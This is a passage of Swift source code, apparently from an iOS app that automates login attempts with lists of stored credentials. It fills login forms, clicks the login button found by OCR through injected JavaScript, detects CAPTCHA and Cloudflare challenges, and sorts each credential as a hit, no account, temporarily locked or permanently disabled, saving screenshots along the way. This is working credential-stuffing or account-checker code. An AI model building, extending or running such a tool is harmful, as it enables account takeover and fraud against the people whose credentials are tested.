            if contentLower.contains(term) {
                temporarilyLocked = true
                disabledScore += 40
                disabledSignals.append("+40 TEMP_LOCK '\(term)'")
                break
            }
        }

        let strongDisabledTerms: [(String, Int)] = [
            ("account has been disabled", 60), ("account has been suspended", 60),
            ("account has been blocked", 60), ("account has been deactivated", 60),
            ("your account is locked", 55), ("account is restricted", 50),
            ("permanently banned", 60),
            ("blacklisted", 50), ("contact support", 15),
            ("account is closed", 55), ("self-excluded", 40),
        ]
        for (term, weight) in strongDisabledTerms {
            if contentLower.contains(term) {
                disabledScore += weight
                disabledSignals.append("+\(weight) '\(term)'")
            }
        }

        let weakDisabledTerms: [(String, Int)] = [
            ("disabled", 12), ("suspended", 15), ("blocked", 12),
            ("banned", 15), ("locked", 12), ("restricted", 10),
            ("deactivated", 15),
        ]
        for (term, weight) in weakDisabledTerms {
            if contentLower.contains(term) {
                disabledScore += weight
                disabledSignals.append("+\(weight) '\(term)'")
            }
        }

        // --- FALSE POSITIVE guards ---

        if contentLower.contains("captcha") || contentLower.contains("verify you are human") ||
           contentLower.contains("cloudflare") || contentLower.contains("challenge-platform") {
            successScore = 0
            successSignals.append("-ALL CAPTCHA/challenge detected, zeroed success")
        }

        // --- DECISION: STRICT FAIL-BY-DEFAULT ---
        // Success ONLY if Welcome! text was captured OR page redirected to homepage
        // Everything else is a fail unless explicitly matching incorrect/disabled patterns

        let successThreshold = 60
        let incorrectThreshold = 20
        let disabledThreshold = 30

        if disabledScore >= disabledThreshold && disabledScore > incorrectScore {
            let topSignals = disabledSignals.prefix(3).joined(separator: ", ")
            if temporarilyLocked {
                return EvaluationResult(
                    outcome: .tempDisabled,
                    score: disabledScore,
                    reason: "Temporarily disabled [\(topSignals)]",
                    signals: disabledSignals
                )
            } else {
                return EvaluationResult(
                    outcome: .permDisabled,
                    score: disabledScore,
                    reason: "Permanently disabled [\(topSignals)]",
                    signals: disabledSignals
                )
            }
        }

        if successScore >= successThreshold && successScore > incorrectScore && successScore > disabledScore {
            let topSignals = successSignals.prefix(3).joined(separator: ", ")
            let hasRealMarker = trueDetectionSuccessMarkers.contains { contentLower.contains($0) }
            let reason = hasRealMarker ? "TRUE DETECTION SUCCESS MARKER CONFIRMED" : (redirectedToHomepage ? "HOMEPAGE REDIRECT CONFIRMED" : "SUCCESS SIGNALS DETECTED")
            return EvaluationResult(
                outcome: .success,
                score: successScore,
                reason: "\(reason) [\(topSignals)]",
                signals: successSignals
            )
        }

        if incorrectScore >= incorrectThreshold && incorrectScore > successScore {
            let topSignals = incorrectSignals.prefix(3).joined(separator: ", ")
            return EvaluationResult(
                outcome: .noAcc,
                score: incorrectScore,
                reason: "No account / invalid credentials [\(topSignals)]",
                signals: incorrectSignals
            )
        }

        // DEFAULT: No TRUE DETECTION markers, no redirect, no clear error = NO ACC
        let maxScore = max(successScore, max(incorrectScore, disabledScore))
        let allSignals = successSignals + incorrectSignals + disabledSignals
        let snippet = String(pageContent.prefix(150)).replacingOccurrences(of: "\n", with: " ")
        return EvaluationResult(
            outcome: .noAcc,
            score: maxScore,
            reason: "No account (ambiguous fail) — no TRUE DETECTION markers, no redirect (success:\(successScore) incorrect:\(incorrectScore) disabled:\(disabledScore)) content: \"\(snippet)\"",
            signals: allSignals
        )
    }

    // MARK: - Helpers

    private func retryFill(
        session: LoginSiteWebSession,
        attempt: LoginAttempt,
        fieldName: String,
        sessionId: String = "",
        fill: () async -> (success: Bool, detail: String)
    ) async -> Bool {
        for attemptNum in 1...3 {
            logger.startTimer(key: "\(sessionId)_retryfill_\(fieldName)_\(attemptNum)")
            let result = await fill()
            let ms = logger.stopTimer(key: "\(sessionId)_retryfill_\(fieldName)_\(attemptNum)")
            if result.success {
                attempt.logs.append(PPSRLogEntry(message: "\(fieldName): \(result.detail)", level: .success))
                logger.log("\(fieldName) fill attempt \(attemptNum): \(result.detail)", category: .automation, level: .trace, sessionId: sessionId, durationMs: ms)
                return true
            }
            attempt.logs.append(PPSRLogEntry(message: "\(fieldName) attempt \(attemptNum)/3 FAILED: \(result.detail)", level: .warning))
            logger.log("\(fieldName) fill attempt \(attemptNum)/3 FAILED: \(result.detail)", category: .automation, level: .warning, sessionId: sessionId, durationMs: ms)
            if attemptNum < 3 {
                try? await Task.sleep(for: .milliseconds(Double(attemptNum) * 500))
            }
        }
        failAttempt(attempt, message: "\(fieldName) FILL FAILED after 3 attempts")
        return false
    }

    private func advanceTo(_ status: LoginAttemptStatus, attempt: LoginAttempt, message: String) {
        attempt.status = status
        attempt.logs.append(PPSRLogEntry(message: message, level: status == .completed ? .success : .info))
    }

    private func failAttempt(_ attempt: LoginAttempt, message: String) {
        attempt.status = .failed
        attempt.errorMessage = message
        attempt.completedAt = Date()
        attempt.logs.append(PPSRLogEntry(message: "ERROR: \(message)", level: .error))
    }

    private func captureAlwaysScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, cycle: Int, maxCycles: Int, welcomeTextFound: Bool, redirected: Bool, evaluationReason: String, currentURL: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult) async {
        logger.log("Capturing screenshot cycle \(cycle)/\(maxCycles) autoResult=\(autoResult)", category: .screenshot, level: .trace)
        guard let img = await session.captureScreenshot() else {
            logger.log("Screenshot capture FAILED (nil)", category: .screenshot, level: .warning)
            return
        }
        attempt.responseSnapshot = img

        let compressed: UIImage
        if let jpegData = img.jpegData(compressionQuality: 0.4), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = img
        }

        let screenshot = PPSRDebugScreenshot(
            stepName: "post_login_cycle_\(cycle)",
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: "Cycle \(cycle)/\(maxCycles) | Welcome!: \(welcomeTextFound ? "YES" : "NO") | Redirect: \(redirected ? "YES" : "NO") | \(evaluationReason) | URL: \(currentURL)",
            autoDetectedResult: autoResult
        )
        attempt.screenshotIds.append(screenshot.id)
        onScreenshot?(screenshot)
    }

    private func visionCalibrateSession(session: LoginSiteWebSession, forURL url: String, sessionId: String) async -> LoginCalibrationService.URLCalibration? {
        guard let screenshot = await session.captureScreenshot() else {
            logger.log("Vision calibration: no screenshot available", category: .automation, level: .error, sessionId: sessionId)
            return nil
        }

        let viewportSize = session.getViewportSize()
        let detection = await visionML.detectLoginElements(in: screenshot, viewportSize: viewportSize)

        guard detection.confidence > 0.3 else {
            logger.log("Vision calibration: confidence too low (\(String(format: "%.0f%%", detection.confidence * 100)))", category: .automation, level: .warning, sessionId: sessionId)
            return nil
        }

        let cal = visionML.buildVisionCalibration(from: detection, forURL: url)
        logger.log("Vision calibration: built calibration for \(url) — email:\(cal.emailField != nil) pass:\(cal.passwordField != nil) btn:\(cal.loginButton != nil)", category: .automation, level: .success, sessionId: sessionId)
        return cal
    }

    private func visionClickLoginButton(session: LoginSiteWebSession, sessionId: String) async -> Bool {
        guard let screenshot = await session.captureScreenshot() else { return false }

        let viewportSize = session.getViewportSize()

        for searchTerm in ["Log In", "Login", "Sign In", "Submit", "Enter"] {
            let hit = await visionML.findTextOnScreen(searchTerm, in: screenshot, viewportSize: viewportSize)
            if let hit {
                let js = """
                (function(){
                    var el = document.elementFromPoint(\(Int(hit.pixelCoordinate.x)), \(Int(hit.pixelCoordinate.y)));
                    if (!el) return 'NO_ELEMENT';
                    try {
                        el.focus();
                        el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y)),pointerId:1,pointerType:'touch'}));
                        el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y)),pointerId:1,pointerType:'touch'}));
                        el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        if (typeof el.click === 'function') el.click();
                        if (el.tagName === 'BUTTON' || el.type === 'submit') {
                            var form = el.closest('form');
                            if (form) form.requestSubmit ? form.requestSubmit() : form.submit();
                        }
                        return 'VISION_CLICKED:' + el.tagName;
                    } catch(e) { return 'ERROR:' + e.message; }
                })()
                """
                let result = await session.executeJS(js)
                if let result, result.hasPrefix("VISION_CLICKED") {
                    logger.log("Vision click login button: found '\(searchTerm)' at (\(Int(hit.pixelCoordinate.x)),\(Int(hit.pixelCoordinate.y))) — \(result)", category: .automation, level: .success, sessionId: sessionId)
                    return true
                }
            }
        }

        let detection = await visionML.detectLoginElements(in: screenshot, viewportSize: viewportSize)
        if let btnHit = detection.loginButton {
            let js = """
            (function(){
                var el = document.elementFromPoint(\(Int(btnHit.pixelCoordinate.x)), \(Int(btnHit.pixelCoordinate.y)));
                if (!el) return 'NO_ELEMENT';
                el.focus();
                el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:\(Int(btnHit.pixelCoordinate.x)),clientY:\(Int(btnHit.pixelCoordinate.y))}));
                if (typeof el.click === 'function') el.click();
                return 'VISION_CLICKED:' + el.tagName;
            })()
            """
            let result = await session.executeJS(js)
            if let result, result.hasPrefix("VISION_CLICKED") {
                logger.log("Vision click login button (detection): '\(btnHit.label)' — \(result)", category: .automation, level: .success, sessionId: sessionId)
                return true
            }
        }

        logger.log("Vision click login button: no button found via OCR", category: .automation, level: .warning, sessionId: sessionId)
        return false
    }

    private func visionVerifyPostLogin(session: LoginSiteWebSession, sessionId: String) async -> (welcomeFound: Bool, errorFound: Bool, context: String?) {
        guard let screenshot = await session.captureScreenshot() else {
            return (false, false, nil)
        }
        return await visionML.detectSuccessIndicators(in: screenshot)
    }

    private func captureTerminalScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, step: String, note: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult, terminalType: TrueDetectionService.TerminalError) async {
        let config = TrueDetectionService.TrueDetectionConfig()

        let terminalImage: UIImage?
        if terminalType == .errorBanner {
            terminalImage = await trueDetection.captureErrorBannerCrop(session: session, config: config)
        } else {
            terminalImage = await captureTerminalMessageCrop(session: session, terminalType: terminalType)
        }

        var finalImage = terminalImage
        if finalImage == nil {
            finalImage = await session.captureScreenshot()
        }
        guard let finalImage else { return }

        let compressed: UIImage
        if let jpegData = finalImage.jpegData(compressionQuality: 0.5), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = finalImage
        }

        let previousIds = attempt.screenshotIds
        if !previousIds.isEmpty {
            onPurgeScreenshots?(previousIds)
            attempt.screenshotIds.removeAll()
        }

        attempt.responseSnapshot = compressed

        let screenshot = PPSRDebugScreenshot(
            stepName: step,
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: note,
            autoDetectedResult: autoResult
        )
        attempt.screenshotIds = [screenshot.id]
        onScreenshot?(screenshot)

        logger.log("Terminal screenshot captured for \(step) — purged \(previousIds.count) previous screenshot(s)", category: .screenshot, level: .info)
    }

    private func captureTerminalMessageCrop(session: LoginSiteWebSession, terminalType: TrueDetectionService.TerminalError) async -> UIImage? {
        guard let fullScreenshot = await session.captureScreenshot() else { return nil }
        guard let webView = session.webView else { return fullScreenshot }

        let keywords: [String]
        switch terminalType {
        case .temporarilyDisabled:
            keywords = ["temporarily", "temporarily disabled", "temporarily locked", "temporarily suspended", "too many attempts", "try again later"]
        case .accountDisabled:
            keywords = ["account is disabled", "account has been disabled", "account has been suspended", "permanently banned", "account is closed", "self-excluded", "account has been blocked"]
        case .errorBanner:
            return fullScreenshot
        }

        let keywordsJS = "[" + keywords.map { "'\($0)'" }.joined(separator: ",") + "]"

        let searchJS = """
        (function() {
            var keywords = \(keywordsJS);
            var allElements = document.querySelectorAll('div, p, span, h1, h2, h3, h4, h5, h6, li, td, section, article, aside, label, strong, em, b');
            for (var i = 0; i < allElements.length; i++) {
                var el = allElements[i];
                var text = (el.textContent || '').toLowerCase();
                var visible = el.offsetParent !== null || el.offsetHeight > 0;
                if (!visible) continue;
                for (var k = 0; k < keywords.length; k++) {
                    if (text.indexOf(keywords[k]) !== -1) {
                        var rect = el.getBoundingClientRect();
                        if (rect.width > 20 && rect.height > 10) {
                            return JSON.stringify({x: rect.left, y: rect.top, w: rect.width, h: rect.height});
                        }
                    }
                }
            }
            return null;
        })();
        """

        if let result = await session.executeJS(searchJS),
           let data = result.data(using: .utf8),
           let json = try? JSONSerialization.jsonObject(with: data) as? [String: Double],
           let x = json["x"], let y = json["y"], let w = json["w"], let h = json["h"],
           w > 20, h > 10 {

            let viewSize = webView.bounds.size
            guard let cgImage = fullScreenshot.cgImage else { return fullScreenshot }
            let imageW = CGFloat(cgImage.width)
            let imageH = CGFloat(cgImage.height)
            let scaleX = imageW / viewSize.width
            let scaleY = imageH / viewSize.height

            let padding: CGFloat = 20
            let cropRect = CGRect(
                x: max(0, x * scaleX - padding),
                y: max(0, y * scaleY - padding),
                width: min(imageW, w * scaleX + padding * 2),
                height: min(imageH, h * scaleY + padding * 2)
            )

            if let croppedCG = cgImage.cropping(to: cropRect) {
                return UIImage(cgImage: croppedCG, scale: fullScreenshot.scale, orientation: fullScreenshot.imageOrientation)
            }
        }

        return fullScreenshot
    }

    private func captureDebugScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, step: String, note: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult = .unknown) async {
        guard let fullImage = await session.captureScreenshot() else { return }

        attempt.responseSnapshot = fullImage

        let compressed: UIImage
        if let jpegData = fullImage.jpegData(compressionQuality: 0.4), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = fullImage
        }

        let screenshot = PPSRDebugScreenshot(
            stepName: step,
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: note,
            autoDetectedResult: autoResult
        )
        attempt.screenshotIds.append(screenshot.id)
        onScreenshot?(screenshot)
    }
}
